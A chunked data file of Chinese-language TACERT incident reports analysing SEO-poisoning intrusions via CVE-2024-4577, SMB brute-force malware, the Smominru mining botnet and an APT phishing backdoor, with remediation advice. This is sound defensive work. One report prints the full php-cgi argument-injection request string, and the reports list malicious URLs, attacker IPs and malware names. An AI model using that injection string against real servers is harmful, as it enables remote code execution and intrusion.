站主機進行攻擊,",
        "Page_Num": "3,4"
    },
    "213": {
        "File_Name": "個案分析-SEO中毒攻擊事件分析報告.pdf",
        "content": "例如: SQL 注入攻擊、目錄遍歷攻擊、命令注入攻 擊...,共有922 筆紀錄。 6. 該網站主機疑似扮演跳板網站,協助14 個惡意IP 連線別的網站。 四、 事件檢測-案例B 大學SEO 中毒攻擊事件 1. 受害網站採用XAMPP 3.3 架站,疑似存在CVE-2024-4577 漏洞。 2. 主機管理者帳戶未設定密碼。 3. 在網站目錄(\\htdocs)下的img 資料夾內有大量亂碼的gz 壓縮檔,將這些 檔案解壓縮後,以網頁格式開啟會發現Google 搜尋的關鍵字,例如: 股票。 4. 在網站主機內發現下表所列惡意檔案,皆由本機管理者帳戶所建立。 檔案名稱 建立日期 修改日期 說明(Virustotal) abuok.php 2024/07/18 上午04:14 2024/07/27 上午01:22 以hex2bin 解碼,若符合條 件,eval 會執行該PHP 程 式碼。 tx.php 2024/09/13 下午02:05 2024/09/13 下午02:05 經過Base64 解碼與XOR 解密後,會使用eval 函數 來執行程式碼。 /img/cmd.php 2024/07/18 上午10:37 2024/07/18 上午10:37 為一個可下執行命令的 webshell。 adminphp.php 2024/07/18 下午11:42 2024/07/18 下午11:42 混淆過的程式碼,使用了 一些技術來隱藏真正的意  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檔案名稱 建立日期 修改日期 說明(Virustotal) 圖。 App.exe 2024/07/31 上午11:00 2024/07/31 上午11:00 挖礦程式(54/72) config.json 2024/07/31 上午11:00 2024/07/31 上午11:00 內有礦池與帳戶資訊 。 m.exe 2024/08/08 上午10:45 2024/07/31 上午10:57 下載器(30/72) 。 WinRing0x64.sys 2024/07/31 上午11:00 2024/07/31 上午11:00 為",
        "Page_Num": "4,5"
    },
    "214": {
        "File_Name": "個案分析-SEO中毒攻擊事件分析報告.pdf",
        "content": "惡意的驅動程式(3/72)。 從系統日誌發現第一筆紀錄之日期為2024/11/3 下午02:36,無法追蹤 2024/07/18 當日的主機帳戶登入情形。 5. 該網站主機疑似扮演跳板網站,協助11 個惡意IP 連線別的網站。 6. 比對惡意PHP 檔案的建立日期與網站日誌紀錄,發現IP:219.77.4.39 於 10/14 01:40~02:16 陸續使用abuok.php、tx.php、goto.php 與twini.php, 同時本機管理者帳戶建立Web、wjt 與許多亂碼的gz 壓縮檔,為本次 事件發生的主要攻擊行為。 五、 事件檢測-案例C 大學SEO 中毒攻擊事件 1. 受害網站採用XAMPP 3.3 架站,可能存在CVE-2024-4577 漏洞。 2. 主機管理者帳戶使用弱密碼,而且久未更新密碼。 3. 在網站目錄下的img 資料夾內有大量亂碼的gz 壓縮檔。 4. 主機內找不到任何惡意php 檔案,但有挖礦程式存在。 5. 由AutoRuns 工具發現該主機有執行GoHTTP 的服務設定,但執行檔案 go.exe 已不存在。 6. 在網站主機內發現下表所列惡意檔案,皆由本機管理者帳戶所建立。 檔案名稱 建立日期 修改日期 說明(Virustotal) Web 2024/11/18 下午05:06 2024/11/20 下午03:39 內容為亂碼,無法辨別 用途。 wjt 2024/11/18 下午05:06 2024/11/18 下午05:06 內容為yes。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檔案名稱 建立日期 修改日期 說明(Virustotal) nanominer-windows -3.9.1.zip 2024/06/19 上午04:57 2024/06/19 下午08:51 內含挖礦程式 nanominer.exe nanominer.exe - 2024/04/05 上午05:08 挖礦程式 (28/71) 從系統日誌發現第一筆紀錄之日期為2024/10/23 上午02:10,無法追蹤 2024/06/19 當日的主機帳戶登入情形。 7. IP: 218.250.231.1",
        "Page_Num": "5,6"
    },
    "215": {
        "File_Name": "個案分析-SEO中毒攻擊事件分析報告.pdf",
        "content": "04 在2024/11/1 下午11:28~2024/11/2 上午12:56 拜訪網 站,有159 筆紀錄。它Get 與Post abu.php 75 次、goto.php 15 次與 webaaa.php 20 次、Get hkini.php 1 次、Get ml.php 2 次,而這些檔案在 檢測時皆已經不存在主機內。它曾使用webaaa.php 讀取過網站目錄下 的檔案,推測webaaa.php 可能為一個可下指令的webshell。 8. 該網站主機疑似扮演跳板網站,協助荷蘭IP:80.66.83.49 在2024/11/4 ~2024/11/5 期間連線別的網站。此IP 連線過案例A~C 三間學校。 六、 SEO 中毒攻擊事件之攻擊手法 1. 從本次三間案例學校的網站日誌中,發現許多CVE-2024-4577 漏洞攻 擊紀錄。以B 大學為例,在2024/06/11 下午03:47 開始該網站主機就出 現有IP 輸入參數在檢測網站是否存在CVE-2024-4577 漏洞。從參數內 容發現有啟用allow_url_include=1,以及自動包含 php://input,這可能 會使系統易受遠端代碼執行(RCE)攻擊。 /php-cgi/php-cgi.exe?d+cgi.force_redirect=0+d+disable_functions=\"\"+d+ allow_url_include=1+d+auto_prepend_file=php://input 2. 造成本次攻擊的主要原因是因為受害學校採用老舊版本的XMAPP 建 置網站,導致駭客應用CVE-2024-4577 漏洞,開啟「allow_url_include」 的功能,以及使用「auto_prepend_file=base64 payload」下載惡意程式  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 碼。 3. 將auto_prepend_file 下載的payload 以base64 解碼後,發現為SEO 中毒 攻擊的程式碼。從程式碼中可看到/img/與/.tmp/兩個",
        "Page_Num": "6,7"
    },
    "216": {
        "File_Name": "個案分析-SEO中毒攻擊事件分析報告.pdf",
        "content": "資料夾,這些資料 夾在受害電腦中曾出現,也發現http[://]tw[.]qqvv[.]org/txt/tw.txt。 4. 查詢http[://]tw[.]qqvv[.]org/txt/tw.txt 內容,發現內容與此次SEO 中毒攻 擊行為有關。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 七、 三案例之攻擊行為分析 1. 案例共同情形 (1) 皆使用XAMPP 架站,而且版本老舊,存在CVE-2024-4577 漏洞。 (2) 在img 資料夾內有大量亂碼的gz 壓縮檔,以及存在Web 與wjt 兩個 檔案。 (3) 皆有挖礦程式(例如:winsys.exe、App.exe 與nanominer.exe) 。 (4) 皆曾經有使用goto.php 與GotoHTTP 服務。 (5) 皆有一個可執行命令的webshell (例如:cmd.php、goto.php 與 webaaa.php)。 (6) abuok.php 為常被駭客使用的PHP 檔。 (7) 皆與tw.qqvv.org/txt/tw.txt 有關。 (8) 荷蘭IP:80.66.83.49 同時將三個案例視為跳板網站。 八、 總結與建議 1. 本次所分析的SEO 中毒攻擊事件案例,受攻擊的網站以老舊版本的 XAMPP 架站居多,攻擊者應用CVE-2024-4577 漏洞,又有些網站主機 的管理者帳戶使用弱密碼,以致於可能造成本次事件發生。 2. 攻擊者透過abuok.php 的eval 函數從遠端執行程式碼。在分析各案例的 網站日誌時,發現abuok.php 被存取的很頻繁。 3. 從案例中發現攻擊者與受害網站建立連線,將受害網站視為跳板主機去 連線別的網站。 4. 在處理本案時,有下列建議事項提供參考。 (1) 如確認已遭到SEO 中毒攻擊,建議至Google Search Console 服務申 請「管理帳號」與申請「移除網址」,來清除Google 搜尋結果產生 的錯誤資訊。(請",
        "Page_Num": "7,8"
    },
    "217": {
        "File_Name": "個案分析-SEO中毒攻擊事件分析報告.pdf",
        "content": "參考附錄一與附錄二)  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2) 建議網站管理者設定帳戶之密碼時,加強密碼強度。 (3) 因為CVE-2024-4577 漏洞影響所有安裝在Windows 作業系統上的 PHP 版本,另因 PHP 8.0 分支、PHP 7 以及 PHP 5 官方已不再維 護,建議使用這些版本的網站管理者升級到最新PHP 官方仍有維護 之版本,或採取相應的緩解措施。 (4) 對於無法升級的系統,可以考慮其他暫時緩解措施,如修改 Rewrite 規則以阻擋攻擊或取消 PHP CGI 的功能。 (5) 因PHP CGI 是一個過時且有問題的架構,建議網站管理者評估遷移 到更安全的架構(例如 Mod-PHP、FastCGI 或 PHP-FPM)的可能 性。 (6) 網站管理者如確認網站未使用到 PHP CGI 功能,可修改 Apache Httpd 設定檔,以避免暴露弱點。更多資訊可參考「資安通報:PHP 遠端程式碼執行 (CVE-2024-4577) - PHP CGI 參數注入弱點」,來進 行相關防護措施。 參考資料 1. 資安通報:PHP 遠端程式碼執行 (CVE-2024-4577)-PHP CGI 參數注入弱點 https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argumen t-injection-vulnerability/ 2. CVE-2024-4577 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4577 3. What is SEO Poisoning? https://www.checkpoint.com/tw/cyber-hub/cyber-security/what-is-cyber-attack/w hat-is-seo-poisoning/  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 附錄一:向Google Search Console 服務申請「管理帳號」 1. 網站管理者至Google Search Console 服務(網址: https://search.google.com/",
        "Page_Num": "8,9,10"
    },
    "218": {
        "File_Name": "個案分析-SEO中毒攻擊事件分析報告.pdf",
        "content": "u/1/search-console/)申請管理帳號。 圖1. Google Search Console 申請頁面 2. 請輸入網域資訊,接著即會繼續如圖2 的驗證程序,請下載該認證檔,並上 傳至網站(通常為網站根目錄(Documentroot))。 圖2. Google Search Console 驗證程序  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 在上傳完成後,即可完成驗證所有權,如圖3 所示。 圖3. 驗證成功訊息 附錄二:申請移除網址 1. 網站管理者登入Google Search Console 服務後,先點選「(A)移除網址」,再 點選「(B)新要求」後,即可輸入要清除的網址等資訊,待Google 作業完成 後,即可清除相關資訊。 ",
        "Page_Num": "10,11"
    },
    "219": {
        "File_Name": "個案分析-SMB暴力破解密碼攻擊事件分析報告_10903.pdf",
        "content": "SMB 暴力破解密碼 攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2020 年03 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2020/01/07 某學校有22 個IP 在同一天觸發「SMB.Login.Brute.Force」偵測規 則,造成該校一天之內被開22 張資安通報單。 2. 這些受害IP 所屬設備皆會對外連線攻擊多個目的IP 的445 port 或1433 port。 3. 由本案22 個IP 的事件發現時間點推測,該類攻擊在2020/01/07 當天凌晨開 始。 4. 該事件發生後部分IP 主機即被緊急處理,無法採證,但為了瞭解這些IP 主 機群的攻擊行為與危害程度,本中心對學校所能提供三台主機(IP: 140.X.X.81、140.X.X.69 與140.X.X.199)進行鑑識作業。 二、事件檢測 1. 首先,本資安事件所檢測的三台主機之主機資訊與用途說明如下。 主機簡稱 IP 主機用途 作業系統 81 主機 140.X.X.81 校外遠端連線校內 主機用 Windows Server 2008 R2 Service Pack 1 69 主機 140.X.X.69 派車系統 Windows Server 2008  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 主機簡稱 IP 主機用途 作業系統 199 主機 140.X.X.199 一般行政事務用 Windows 7 Service Pack 1 2. 199 主機的檢測資訊如下: 2.1 由系統日誌發現在2020/01/07 8:33:24 IP:140.X.X.200 使用帳戶 Administrator 登入主機,執行VB Script 腳本來利用Windows Installer 程式安 裝軟體。 2.2 之後主機在2020/01/07 08:33:26 開始有一連串安裝軟體與重新開機的動 作,而且此類型的Windows Installer 行為會連到一個網址 Http[://]Ae.A15.Xyz/SMB2P.JPG。該網址經Virustotal 檢測其惡意比例為 0",
        "Page_Num": "1,2,3"
    },
    "220": {
        "File_Name": "個案分析-SMB暴力破解密碼攻擊事件分析報告_10903.pdf",
        "content": "/72,僅有一家防毒軟體公司認為其為可疑的惡意網址。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 接著系統會告知該產品已安裝完成,從系統日誌可以得知其產品名稱 (AVKYBZWVUCEWXPTGJRQMEOMIGWHUSLDEXBNI)為一段亂碼。 在安裝完成後會出現重新開機的訊息。由這一連串的行為得知此產品在一分 鐘之內被安裝完成,而且安裝完成後會重新開機。 軟體安裝完成重開機後,會啟動Remote Procedure Call(RPC)服務,而且防毒 軟體偵測到特洛伊病毒Ms18DB4494App.dll 使用svchost.exe 在執行。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2.3 檢視執行中的所有Svchost.exe 程序,發現Svchost.exe(2116)執行RPCSS, 對外大量建立目的IP:445port 或1433port 的連線。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2.4 檢視連線目的445port 的封包內容,發現199 主機對外建立445port 連線 後,目的IP 主機會回傳該主機的系統資訊,而199 主機會嘗試破解帳戶 Administrator 的密碼。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 比對主機對外連線目的IP 之445port 的時間點與所截錄IP 封包的時間點,發 現svchost.exe 執行時,若199 主機以帳戶Administrator 成功登入有開啟 445port 的主機時,會傳送VB Script 腳本給該IP 主機。 2.5 檢視背景程式與對外連線,發現199 主機對同網段IP 的445 Port 建立連 線,而且使用系統內建System 程序來建立。該System 程序對外開啟主機的 139、445 與5357 port。 2.6 在C:/Windows/Temp 資料夾內發現許多與前述所提產品安裝時有關的檔 案。這些檔案都是在2020/01/07 08:33",
        "Page_Num": "3,4,5,6,7"
    },
    "221": {
        "File_Name": "個案分析-SMB暴力破解密碼攻擊事件分析報告_10903.pdf",
        "content": "被建立的。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2.7 「Administrator」為廠商所建立來維護主機用之帳戶,但該帳戶沒有設 定密碼。 3. 查看69 主機與81 主機的系統日誌,出現與199 主機一樣的情形,僅執行時 間與網址不同。 4. 69 主機在2020/01/07 01:24 開始安裝軟體與重新開機,其所連線的網址為 Http[://]Ae.A15.Xyz/SMB2.JPG,該網址經Virustotal 檢測其惡意比例為0/72。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 81 主機在2020/01/07 01:30 開始安裝軟體與重新開機,其所連線的網址為 Http[://]Ae.A15.Xyz/SMB1.JPG,該網址經Virustotal 檢測其惡意比例為9/72。 6. 經由檢測三台主機得知這些主機有下列共同的特徵。 項目 81 主機 69 主機 199 主機 有無帳戶 Administrator/ 有無密碼 有/有設密碼 有/未設密碼 有/未設密碼 445 port 是否開啟 是 是 是 3389port 是否開啟 是 是 是 2020/01/07 執行 Windows Installer 時間 2020/01/07 01:29 2020/01/07 01:24 2020/01/07 08:33 其他 系統內建執行程 式帳戶system 於 2020/01/07 01:29 登入、執行軟體安 裝。 系統內建執行程 式帳戶system 於 2020/01/07 01:24 登入、執行軟體安 裝。 由同一網段 IP:140.X.X.200 於 2020/01/07 08: 33 登入,使用VB Script 腳本,之後 帳戶system 於 2020/01/07 08:33 執行軟體安裝。 三、事件攻擊行為示意圖 本事件三台主機的攻擊手法皆相同,以199 主機為例,說明如下圖。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 駭客對帳戶Administrator 進行暴力破解密碼。 2. 執行VBScript 腳本來利用Windows Install",
        "Page_Num": "7,8,9,10"
    },
    "222": {
        "File_Name": "個案分析-SMB暴力破解密碼攻擊事件分析報告_10903.pdf",
        "content": "er 程式安裝軟體。 3. 連到網址Http[://]Ae.A15.Xyz/SMB2P.JPG 下載檔案。 4. 執行Windows Installer 安裝產品 AVKYBZWVUCEWXPTGJRQMEOMIGWHUSLDEXBNI。 5. 安裝完成後主機重新開機。 6. 重新開機後,主機會啟動Remote Procedure Call(RPC)服務。 7. 程序System 會對同網段IP 的445 Port 建立連線。 8. Svchost.exe 會執行RPCSS,對外大量建立目的IP:445port 或1433port 的 連線,收集各連線主機的系統資訊,並且嘗試破解帳戶Administrator 的 密碼。當成功登入受害主機後,會傳送VB Script 腳本給受害主機。 四、總結與建議 1. 本事件的攻擊行為主要是駭客利用SMB 漏洞進行暴力破解密碼,進而攻  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 擊有開啟445port 的目的IP 主機,造成多台主機感染惡意程式。 2. 維護廠商在安裝學校主機時會習慣性建立帳戶Administrator,以便維護使 用,但該帳戶未設定密碼,讓駭客很容易駭入主機。 3. 當主機被駭入後會使用VB Script 腳本執行Windows Installer,連至網址 Http[://]Ae.A15.Xyz/SMB2P.JPG 下載檔案來安裝惡意程式。 4. 當主機安裝惡意程式完成並重開機後,Svchost.exe 會對外進行大量的 445port 或1433port 的攻擊連線。 5. 關於本事件的預防措施,有幾點建議如下: (1) 建議關閉駭客常會攻擊的445port。 (2) 如需開啟3389port,建議限制連線來源的IP。 (3) 定期更新防毒軟體的病毒碼,並且定期進行掃毒作業。 (4) 檢視主機帳戶資訊,並關閉非必要的帳戶。 (5) 加強帳戶的密碼強度。 (6) 定期更新作業系統與修補程式的漏洞。 (7) 定期備份資料。 ",
        "Page_Num": "10,11"
    },
    "223": {
        "File_Name": "個案分析-Smominru挖礦攻擊事件分析報告_10704.pdf",
        "content": "個案分析- Smominru 挖礦攻擊事件 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 107 年4 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 2018 年1 月底安全研究公司Proofpoint 發現從2017 年5 月開始美國國家安全 局外流的EternalBlue 攻擊工具變身惡意程式Smominru,專門攻擊Windows 漏洞(CVE-2017-0144)來入侵Windows 伺服器,使受害主機加入殭屍網路, 進而讓受害主機挖掘門羅幣(Monero)。該公司研究人員判斷Smominru 感染 了超過五十萬台以上的Windows 主機來建立殭屍網路,其中多半為伺服器, 這些機器分佈世界各地,但密度最高地區依序為俄羅斯、印度及台灣。 2. 在學術網路中,從2018 年3 月開始也陸續出現Smominru 的資安事件,經統 計在2018 年3 月觸發的Smominru 資安事件共有71 件。從這些資安事件所偵 測到的佐證資料中發現,可能礦池有3 個(如下所列),通常受害主機會連線 一到兩個礦池。 礦池1: 78.142.29.152 (xmr.xmr5b.ru:8888) 保加利亞 礦池2: 170.178.171.162 (170.178.171.162:8888) 美國 礦池3: 170.178.171.173 (64.mymyxmra.ru:8888) 美國 No 偵測規則 件數 1 Botnet:Smominru.Botnet 37 2 MALWARE-CNC Win.Trojan.Smominru outbound call 34 3. 為了瞭解該類型資安事件的觸發原因與攻擊行為,本中心取得樣本後進行檢  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 測。 II. 事件檢測 1. 首先,在開始檢測前,我們將Smominru 的樣本lsmosee.exe 送至Virustotal 網站檢測,發現它被防毒軟體公司檢測出為惡",
        "Page_Num": "1,2,3"
    },
    "224": {
        "File_Name": "個案分析-Smominru挖礦攻擊事件分析報告_10704.pdf",
        "content": "意的比例高達50/63,仍有13 家公司無法檢測出的它的存在,其中只有2 家公司稱它為Smominru,其餘大 多數的公司稱它為Miner 或CoinMiner。 2. 在Windows Server 2012R2 作業系統環境下,我們進行環境隔離檢測。在執 行惡意程式lsmosee.exe 後,檢視其對外連線狀況,發現會連至下列IP 位置: No 目的IP 目的Port 目的IP 所屬國家 1 78.142.29.152 8888 保加利亞 2 78.142.29.152 13000 保加利亞 3 107.191.99.95 5555 美國 4 118.184.176.15 80 中國  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 檢視受測主機的CPU 效能,發現程式lsmosee.exe 執行時CPU 效能衝高,將 近100%,疑似挖礦行為。 4. 檢視受測主機背景程式運作情形,發現程式lsmosee.exe 執行後會呼叫程式 conhost.exe。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 在惡意程式程式lsmosee.exe 執行後,會在與它所在的資料夾內出現一個名 為「cudart32_65.dll」的檔案,經Virustotal 網站檢測,惡意比例為0/55。 6. 檢視受測主機內各資料夾,發現在C:\\Windows\\debug 資料夾內,有新增一個 執行檔lsmose.exe,將它送至Virustotal 網站檢測,發現其為惡意之比例 為0/56。 7. 檢視所側錄的封包內容,發現該受測主機會連線至美國 IP:104.155.224.46:8888 想取得md5.txt、cudart32_65.dll 與64.rar 等檔 案,而目的主機回應「sinkholed by abuse.ch」訊息,可以得知abuse.ch 已透過sinkholing 技術介入處理,攔截連線到此IP 的所有連線。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency",
        "Page_Num": "3,4,5,6"
    },
    "225": {
        "File_Name": "個案分析-Smominru挖礦攻擊事件分析報告_10704.pdf",
        "content": "Response Team 8. 將受測主機連線網址http://64.myxmr.pw:8888/送至virustotal 網站進行 URL 檢測,得到下列結果,顯示該網址為惡意網址。 No URL 視為惡意網址之比例 1 http://64.myxmr.pw:8888/md5.txt 9/67 2 http://64.myxmr.pw:8888/cudart32_65.dll 11/67 3 http://64.myxmr.pw:8888/64.rar 11/67 9. 檢視連線至目的IP: 118.184.176.15 (port:80)的封包內容,發現受測主機 與該IP 進行IP 報到驗證,取得受測主機當下實體IP 位置。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 將受測主機連線網址http://www.pubyun.com/dyndns/getip/送至 Virustotal 網站進行URL 檢測,得知其為惡意網址之比例有4/67。 11. 檢視連線至目的IP:78.142.29.152(port:8888)的封包內容,發現受測主機 連線礦池xmr.5b6b7b.ru:8888 下載xmrok.txt 檔案。開啟xmrok.txt 檔案, 發現無法識別內容,而其惡意比例經Virustotal 檢測為0/58。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 將受測主機連線網址http://xmr.5b6b7b.ru:8888/xmrok.txt 送至 virustotal 網站進行URL 檢測,得知其為惡意網址之比例有5/67,有5 家防 毒軟體公司視它為惡意網址,而有2 家公司認為它是可疑網站。 13. 檢視連線至目的IP:107.191.99.95 (port:5555)的封包內容,發現受測主 機以錢包帳號 「43Lm9q14s7GhMLpUsiXY3MH6G67Sn81B5DqmN46u8WnBXNvJmC6F",
        "Page_Num": "6,7,8"
    },
    "226": {
        "File_Name": "個案分析-Smominru挖礦攻擊事件分析報告_10704.pdf",
        "content": "wH3ZMwAmkEB1 nHSrujgthFPQeQCFPCwwE7m7TpspYBd」登入此目的IP 主機(礦池),而目的IP 主機會回傳目前礦池狀態與挖礦作業id 資訊給受測主機。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 目的IP 主機指派一次挖礦作業(含job id)回傳給受測主機後,受測主機 submit 上傳一次挖礦作業執行成果給目的IP 主機,最後目的IP 主機回應目 前礦池狀態ok 給受測主機,如此重複該項動作,進行挖礦。 14. 檢視連線至目的IP:78.142.29.152(port: 13000)的封包內容,發現受測主 機傳送CPU 規格與作業系統資訊給IP:78.142.29.152:13000。 III. 網路架構圖  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 惡意程式Smominru 透過攻擊Windows 漏洞(CVE-2017-0144)來入侵 Windows 伺服器。 2. 惡意程式Smominru 入侵後呼叫程式Conhost.exe。 3. 受害主機連線IP:104.155.224.46:8888 下載3 個檔案(md5.txt、 cudart32_65.dll 與64.rar)。 4. 受害主機連線IP:118.184.176.15:80 進行IP 報到驗證、取得受測主機 IP 資訊。 5. 受害主機連線IP:78.142.29.152:8888(礦池)下載xmrok.txt 檔案。 6. 受害主機登入礦池(IP:107.191.99.95:5555)取得礦池狀態與挖礦作業 id 資訊,並且開始挖礦作業。 7. 受害主機傳送CPU 規格與作業系統資訊給IP:78.142.29.152:13000。 IV. 建議與總結 Smominru 最喜歡攻擊的對象就是Windows 伺服器,因為它是市場上最理想 的主機之一,不僅總是處於「打開」狀態,而且擁有比個人電腦更強的處理  10 臺灣",
        "Page_Num": "8,9,10,11"
    },
    "227": {
        "File_Name": "個案分析-Smominru挖礦攻擊事件分析報告_10704.pdf",
        "content": "學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 能力,能增加挖礦的速度與效能。它通過EternalBlue(CVE-2017-0144 SMB) 進行攻擊,以感染新節點並增加殭屍網路的大小。目前來自安全研究公司 Proofpoint、abuse.ch 和ShadowServer Foundation 等組織的網路安全人員試圖 用「sinkholing」的技術來消滅這個殭屍軟體,但結果並不成功,Smominru 惡意軟體在短暫停止之後,很快又恢復了攻擊。為了預防Smominru 攻擊事 件的發生,建議下列幾點措施。 1. 修補Windows(CVE-2017-0144)漏洞、執行Windows Server 系統 與應用程式的更新作業。 2. 關閉Windows 系統的445 通訊埠。 3. 針對容易受到攻擊的Windows 伺服器,如電子郵件與網站等,加 強安全機制、監控Windows 系統CPU 效能。 4. 利用應用程式控制機制防止可疑檔案被執行,可阻擋程式遭受不 正當的修改。 5. 應用網路分割的網路佈線規劃,降低內部網路的電腦遭受攻擊和 損害的風險。 6. 確認防毒軟體已更新至最新版本病毒碼與偵測程式碼,並定期執行電腦掃 毒作業。 V. 相關報導 1. 逾50 萬台Windows 伺服器淪為Monero 挖礦機,台灣為第三大 受災區 https://www.ithome.com.tw/news/121078  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. Smominru Monero mining botnet making millions for operators https://www.proofpoint.com/us/threat-insight/post/smominru-monero-mining- botnet-making-millions-operators ",
        "Page_Num": "11,12"
    },
    "228": {
        "File_Name": "個案分析-S單位與E單位之APT社交工程事件分析_10208.pdf",
        "content": "個案分析- S 單位 與 E 單位 之APT 社交 工程郵件事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/08  1 前言 TANET 中某單位行政部門同仁收到含有惡意程式附檔的電子郵件,實為常見的 APT 社交工程攻擊,該附件檔命名為“通訊錄.rar”,解開後有一個正常word 檔案、一個lnk 執行檔案及一個ini 隱藏檔,該lnk 執行檔會去執行惡意的隱藏 檔,一旦執行後ini 隱藏檔就會自我移除,並且於背景產生一隻後門程式 PeerDistSvc.exe 將電腦資料傳送給上層的感染主機,並且該程式會常駐在開機時 後自動執行。一旦遭受感染的主機可能個資帳密都會外洩,務必將惡意程式移除 後更改帳號及密碼。 事件說明 一、 檢測工具及環境準備: 1. 測試主機為VMware: Win7(x64),無安裝任何修補程式。 2. 安裝的Office 2007 版本,無安裝任何修補程式。 3. 使用實體IP,並用Wireshark 側錄該感染主機之Pcap 封包。 4. 使用Currport 每2 秒去紀錄網路連線埠號的使用狀況。 5. 使用procmon 紀錄該程式的變化。 二、 事件過程(一)-S 單位: 1. 06/20 S 單位內部某同仁收到疑似含後門程式之惡意信件。 2. 06/20 S 單位將該惡意信件封存為msg 檔以保留信件Header,請本單位 TACERT 協助測試分析。 3. 此惡意原始信件資訊為: (1). 收件者另含隱藏密件副本,從信件標頭只知會CC 給S 單位某人。 4. 該附件『通訊錄.rar』解壓縮後有三個檔案:  2 (1). 6 月17 日.doc:為正常檔案,內含許多人的姓名、電話、Email。 (2). 0617photo.lnk:為一個連結執行檔。 (3). desktop.ini:為隱藏的組態檔,是惡意後門程式,文件編輯顯示內容為 亂碼",
        "Page_Num": "1,2,3"
    },
    "229": {
        "File_Name": "個案分析-S單位與E單位之APT社交工程事件分析_10208.pdf",
        "content": "。 圖1、『通訊錄.rar』解壓縮之後檔案 三、 檢測過程-S 單位: 1. 將檔案『6 月17 日.doc』上傳至Virustotal 檢測正常。 2. 將檔案『0617photo.lnk』上傳至Virustotal 檢測正常,其hash value 比對其 實是為cmd.exe,為合法檔案做的偽裝,主要執行隱藏的desktop.ini。 3. 將隱藏檔案desktop.ini 上傳至Virustotal 檢測,病毒檢出比例6/47。信件 檔案『6 月17 日.doc』為正常檔案,開啟後有許多人的個資,如名字、電 話及Email。 4. 執行信件檔案『0617photo.lnk』,此檔會執行同目錄下的隱藏檔 『desktop.ini』。 圖2、0617photo 其實是去執行惡意檔desktop.ini 5. 之後『desktop.ini』就會自我刪除,並產生一個叫做『PeerDistSvc.exe』(或 其他名稱)的執行檔開始在背景執行,並開啟TCP Port 對外連線至上層的 中繼站140.X.X.15:443,感染主機個資可能被竊取。 6. 中繼站140.X.X.15 經調查發現是TANET 底下學校的郵件伺服器,位於台 中Y 國中。 7. 『PeerDistSvc.exe』的Hash值比對發現其實就是自我刪除的『desktop.ini』, 藏在在隱藏目錄C:\\Users\\username\\AppData\\Local\\PeerDistSvc.exe。  3 圖3、惡意程式向中繼站主機建立連線 圖4、測試主機向上層中繼站傳送加密資料,中繼站成功接收則回覆OK 8. 透過Tcpview 發現一開始會以特定PID 的『PeerDistSvc.exe』對外的連線, 之後就會變成PID:0 的Unknown 程式去連線,使人不易察覺為異常程式。 9. 原則上惡意程式在C:\\Users\\username\\AppData\\ 會產生執行檔 『igfxtray.exe』在註冊",
        "Page_Num": "3,4"
    },
    "230": {
        "File_Name": "個案分析-S單位與E單位之APT社交工程事件分析_10208.pdf",
        "content": "機碼寫入開機自動於背景執行連線。 圖5、igfxtray 的位置與自動執行 10. 『igfxtray.exe』與『PeerDistSvc.exe』行為一樣,連線至中繼站 140.X.X.15:443 傳送資料,只是『PeerDistSvc.exe』重開機不會自動執行。 11. 『0617photo.lnk』的同目錄下會產生一個『cmd.exe』去執行系統檔  4 rundll32.exe,再執行隱藏目錄C:\\Users\\username\\AppData\\Local\\Temp\\ 的 惡意程式『new.dll』,並建立連線至「220.130.160.113」傳送較大的資料 檔案。 圖6、受害主機向中繼站傳送加密資料,疑似使個資外洩 12. 程序監測工具紀錄出異常程式運作情形。 圖7、紅色標記為惡意程式 四、 簡易網路架構:  5 五、 惡意程式排除方式-S 單位: 1. 先將網路線拔除或關閉網路卡,以中斷連外網路。 2. 用工作管理員或procexp 將惡意程序PeerDistSvc.exe 和igfxtray.exe 刪 除。 3. 將C:\\Users\\username\\AppData\\Local\\PeerDistSvc.exe 惡意程式移除。 4. 將C:\\Users\\username\\AppData\\ igfxtray.exe 惡意程式移除。 5. 用autoruns 或開始執行msconfig 將『igfxtray.exe』自動開機啟動取消移除。 6. 用掃毒軟體掃瞄系統。 六、 事件過程(二)-E 單位: 1. 06/25 上午E 單位內陳姓同仁收到疑似夾帶惡意程式的郵件。 2. 06/25 下午E單位將此信件之附檔轉寄於本單位TACERT進行測試分析, 但因只有檔案並無原始信件,故不易查出寄信者資訊。 3. 